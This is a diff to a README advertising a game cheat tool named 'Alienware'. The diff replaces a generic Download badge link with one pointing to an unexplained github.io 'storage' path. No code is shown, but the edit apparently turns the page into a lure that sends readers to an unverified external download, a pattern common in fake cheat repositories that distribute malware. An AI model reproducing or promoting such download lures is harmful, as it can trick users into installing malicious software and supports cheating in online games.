@@ -13,7 +13,7 @@ I know very well how difficult it is to win games absolutely every time, and bet
 
 Now it's possible! Glad to introduce you - Alienware
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://bosiche.github.io/storage/5h6gf78hg"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="77"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
